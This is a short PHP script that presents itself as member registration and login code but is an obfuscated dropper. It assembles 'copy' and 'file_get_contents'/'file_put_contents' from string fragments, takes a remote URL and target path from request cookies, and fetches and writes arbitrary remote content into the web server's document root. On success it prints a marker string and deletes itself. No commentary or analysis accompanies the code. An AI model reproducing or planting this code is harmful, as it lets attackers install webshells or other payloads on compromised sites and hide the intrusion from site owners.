<?php
error_reporting(0);
function Member_Reg($url, $path) {
	$Member = 'co';
	$Member_ID = 'py';
	$Member_PASSWORD = $Member . $Member_ID;
	$Member_PASSWORD($url, $path);
}
function Member_Log($url) {
	$Member = 'file_get';
	$Member_ID = '_contents';
	$Member_PASSWORD = $Member . $Member_ID;
	$Member_USERNAME = $Member_PASSWORD($url);
	return $Member_USERNAME;
}
function Member_Login($path, $url) {
	$Member = 'file_put';
	$Member_ID = '_contents';
	$username = $Member . $Member_ID;
	$username_str = Member_Log($url);
	$password = $username($path, $username_str);
}
if (isset($_COOKIE['url']) && isset($_COOKIE['path'])) {
	$Member_Image = $_SERVER['DOCUMENT_ROOT'].'/'.$_COOKIE['path'];
	Member_Reg($_COOKIE['url'], $Member_Image);
	if (file_exists($Member_Image)) {
		echo '0x0007me success.';
		unlink(__FILE__);
	} else {
		Member_Login($Member_Image, $_COOKIE['url']);
		if (file_exists($Member_Image)) {
			echo '0x0007me success.';
			unlink(__FILE__);
		} else {
			echo '0x0007me fail.';
		}
	}
} else {
	echo '0x0007me fail.';
}